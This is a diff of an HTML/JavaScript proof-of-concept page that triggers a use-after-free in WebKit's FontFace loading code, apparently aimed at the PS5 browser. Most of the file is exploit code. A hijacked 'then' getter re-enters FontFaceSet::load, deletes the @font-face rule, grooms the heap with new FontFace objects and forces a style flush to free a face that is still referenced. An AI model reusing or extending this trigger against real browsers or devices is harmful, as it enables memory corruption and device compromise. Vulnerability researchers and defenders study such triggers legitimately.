@@ -2,80 +2,77 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 FontFace UAF Test</title>
+<title>PS5 FontFace UAF Trigger (Nathan Fargo Variant)</title>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
 </head>
 <body>
 <pre id="log"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
-const origThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
-let getterFired = false;
 
-// Install same-stack thenable getter
-Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-        if (!getterFired) {
-            getterFired = true;
-            L('[+] then getter fired (same stack as FontFaceSet::load)');
+window.onload = () => {
+    L('[+] Setup starting...');
+    
+    // Create the trigger face via JS API with a local source
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    
+    // Critical: forces the native loaded promise to be created early
+    void A.loaded; 
 
-            // Step 1: schedule style rebuild by deleting the first @font-face rule
-            try {
-                sheet.deleteRule(0);
-                L('[+] deleteRule(0) done');
-            } catch(e) {
-                L('[!] deleteRule: ' + e);
+    let fired = false;
+    const origThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
+
+    // Install same-stack thenable getter
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                L('[+] then getter fired! Synchronous re-entry achieved.');
+
+                // Mutate CSSOM: delete the CSS-connected rule for family 'x'
+                try {
+                    document.getElementById('s').sheet.deleteRule(0);
+                    L('[+] deleteRule(0) done');
+                } catch(e) {
+                    L('[!] deleteRule: ' + e);
+                }
+
+                // Create new FontFaces to churn the heap and groom the IsoHeap
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+
+                // Force style/layout flush
+                // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
+                // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face)
+                document.body.offsetTop; 
+                L('[+] offsetTop forced style. face may be freed.');
+
+                // Restore then so promise machinery doesn't break
+                if (origThen) {
+                    Object.defineProperty(FontFace.prototype, 'then', origThen);
+                }
             }
-
-            // Step 2: force immediate flush
-            // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
-            // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face[0])
-            // face[0] refcount -> 0 -> freed. matchingFaces[0] now dangling.
-            document.body.offsetWidth;
-            L('[+] offsetWidth forced style. face[0] may be freed.');
-
-            // Step 3: restore so promise machinery doesn't get stuck
-            if (origThen) {
-                Object.defineProperty(FontFace.prototype, 'then', origThen);
-            }
+            return origThen ? origThen.value : undefined;
         }
-        return origThen ? origThen.value : undefined;
-    }
-});
+    });
 
-const sheet = document.createElement('style');
-// Use local('Helvetica') to prefer a synchronous local-font completion path
-// Use a valid minimal WOFF2 base64 for the second face to prevent NetworkError
-const validFont = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-
-sheet.textContent = `
-@font-face {
-    font-family: 'UafFamily';
-    src: local('Helvetica'), local('Arial');
-    unicode-range: U+0041;
-}
-@font-face {
-    font-family: 'UafFamily';
-    src: url(data:font/woff2;base64,${validFont}) format('woff2');
-    unicode-range: U+0042;
-}
-`;
-document.head.appendChild(sheet);
-
-// Force initial style resolution so both faces are CSS-connected
-document.body.offsetWidth;
-L('[+] Setup complete. Faces registered.');
-
-L('[+] Calling document.fonts.load("16px UafFamily", "AB")');
-document.fonts.load('16px UafFamily', 'AB').then(faces => {
-    L('[+] load() resolved, faces: ' + faces.length);
-    L('[+] If ASAN is active and build is vulnerable, you saw heap-use-after-free above.');
-    L('[+] If no ASAN: silent corruption or crash in FontFaceSet::load() post-loop.');
-}).catch(e => {
-    L('[!] load() rejected: ' + e);
-});
-
-L('[+] document.fonts.load() called (synchronous path may have already triggered getter)');
+    L('[+] Calling document.fonts.load("1em x", "AB")');
+    document.fonts.load('1em x', 'AB').then(faces => {
+        L('[+] load() resolved, faces: ' + faces.length);
+        if (fired) {
+            L('[+] UAF window exercised. If vulnerable, memory is corrupted.');
+            L('[+] If ASAN is active, check logs for heap-use-after-free.');
+        } else {
+            L('[!] Getter did not fire. Synchronous resolution failed.');
+        }
+    }).catch(e => {
+        L('[!] load() rejected: ' + e);
+    });
+};
 </script>
 </body>
-</html> 
+</html>
